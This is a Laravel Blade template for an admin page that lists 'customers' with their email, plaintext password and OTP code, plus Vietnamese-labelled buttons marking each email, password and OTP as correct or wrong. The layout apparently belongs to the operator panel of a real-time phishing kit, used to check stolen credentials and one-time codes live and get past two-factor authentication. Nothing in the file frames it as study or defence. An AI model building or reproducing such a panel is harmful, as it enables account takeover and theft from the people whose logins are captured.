<div class="card">
    <div class="card-header">
        <h4 class="card-title">List customer</h4>
    </div>
    @if (session('success'))
        <div class="alert alert-success">
            {{ session('success') }}
        </div>
    @endif
    <div class="card-body">
        <div class="table-responsive">
            <div id="example2_wrapper" class="dataTables_wrapper">
                <div class="dataTables_scroll">
                    <div class="dataTables_scrollBody"
                        style="position: relative; overflow: auto; max-height: 42vh; width: 100%;">
                        <table id="example2" class="display dataTable" style="width: 100%;" role="grid"
                            aria-describedby="example2_info">
                            <thead>
                                <tr>
                                    <th>Email</th>
                                    <th>Mật Khẩu</th>
                                    <th>Code OTP</th>
                                    <th>Hành động</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach ($customers as $key => $customer)
                                    <tr class="odd" role="row">
                                        <td>{{$customer->email}}</td>
                                        <td>{{$customer->password}}</td>
                                        <td>{{$customer->code_otp}}</td>
                                        <td>
                                            <a class="bg bg-primary text-black" href={{ route('change.status.email',['id' => $customer->id,'status' => 1]) }}>Đúng email</a>
                                            <a class="bg bg-warning text-black" href={{ route('change.status.email',['id' => $customer->id,'status' => 2]) }}>sai email</a>
                                            <a class="bg bg-primary text-black" href={{ route('change.status.password',['id' => $customer->id,'status' => 1]) }}>Đúng mật khẩu</a>
                                            <a class="bg bg-warning text-black" href={{ route('change.status.password',['id' => $customer->id,'status' => 2]) }}>sai mật khẩu</a>
                                            <a class="bg bg-primary text-black" href={{ route('change.status.otp',['id' => $customer->id,'status' => 1]) }}>Đúng otp</a>
                                            <a class="bg bg-warning text-black" href={{ route('change.status.otp',['id' => $customer->id,'status' => 2]) }}>sai otp</a>
                                        </td>
                                    </tr>
                                @endforeach
                            </tbody>

                        </table>
                    </div>
                </div>
                <div class="dataTables_info" id="example2_info" role="status" aria-live="polite">Showing 1 to 57 of
                    57 entries</div>
            </div>
        </div>
    </div>
</div>
